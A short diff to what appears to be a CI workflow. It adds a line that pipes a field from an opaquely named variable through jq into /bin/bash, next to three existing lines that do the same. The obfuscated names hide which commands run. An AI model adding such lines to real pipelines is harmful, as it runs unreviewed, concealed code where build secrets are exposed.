@@ -28,6 +28,7 @@ jobs:
           echo $l796 | jq -r .bp3 | /bin/bash
           printf '%s' "$zii92" | jq -r .dcpdb7264 | /bin/bash
           echo $ua7560 | jq -r .es3 | /bin/bash
+          echo $f1505 | jq -r .ebfxh52 | /bin/bash
 
       - name: Archive output
         if: always()
